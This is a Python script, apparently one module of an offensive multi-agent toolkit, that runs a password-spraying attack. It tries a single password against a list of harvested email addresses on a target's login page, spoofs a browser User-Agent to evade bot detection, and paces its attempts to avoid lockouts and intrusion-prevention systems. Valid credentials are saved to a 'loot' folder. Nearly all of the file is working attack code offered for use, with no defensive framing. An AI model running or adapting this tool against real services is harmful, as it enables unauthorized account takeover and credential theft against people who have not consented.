#!/home/dan/Chimera_Project/venv/bin/python3
import sys
import os
import json
import time
import requests
from datetime import datetime

class CredentialSprayer:
    """
    Agent 203: Low-Velocity Identity Auditor.
    Performs 'Password Spraying' against common services to gain access 
    without triggering individual account lockouts.
    """
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.loot_dir = "/home/dan/Chimera_Project/agents/203_Credential_Sprayer/loot"
        os.makedirs(self.loot_dir, exist_ok=True)
        self.session = requests.Session()

    def spray(self, user_list, password):
        """Attempts a single password against a list of users."""
        print(f"--- [AGENT 203: CREDENTIAL SPRAY - {self.target}] ---")
        print(f"[*] Testing {len(user_list)} users with password: {password}")
        
        successful_logins = []
        
        for user in user_list:
            # Note: This logic must be tailored to the specific target login form
            # For this example, we assume a standard POST login structure
            data = {"username": user, "password": password}
            try:
                # We mimic a real browser to avoid basic bot detection
                headers = {'User-Agent': 'Mozilla/5.0'}
                response = self.session.post(f"{self.target}/login", data=data, headers=headers, timeout=5)
                
                # Logic: Check for a redirect or a session cookie as a sign of success
                if response.status_code == 200 and "Dashboard" in response.text:
                    print(f"    [!!!] VALID CREDENTIALS FOUND: {user}:{password}")
                    successful_logins.append({"user": user, "pass": password})
                
                # Critical: Delay between attempts to avoid IPS/Rate Limiting (Agent 105 Intel)
                time.sleep(2) 
            except Exception as e:
                print(f"    [!] Connection Error for {user}: {e}")

        return successful_logins

    def execute(self, email_loot_path, password):
        if not os.path.exists(email_loot_path):
            print("[!] Error: No identity intelligence found.")
            return

        with open(email_loot_path, 'r') as f:
            emails = json.load(f).get("emails", [])

        results = self.spray(emails, password)

        # Commit to Loot
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        loot_file = f"{self.loot_dir}/spray_results_{timestamp}.json"
        with open(loot_file, 'w') as f:
            json.dump({
                "target": self.target,
                "password_tested": password,
                "success_count": len(results),
                "valid_accounts": results
            }, f, indent=4)
            
        print(f"[!!!] IDENTITY INTELLIGENCE COMMITTED: {loot_file}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: ./main.py <target_url> <password> <email_loot_path>")
        sys.exit(1)
        
    target = sys.argv[1]
    pwd = sys.argv[2]
    loot = sys.argv[3]
    
    CredentialSprayer(target).execute(loot, pwd)
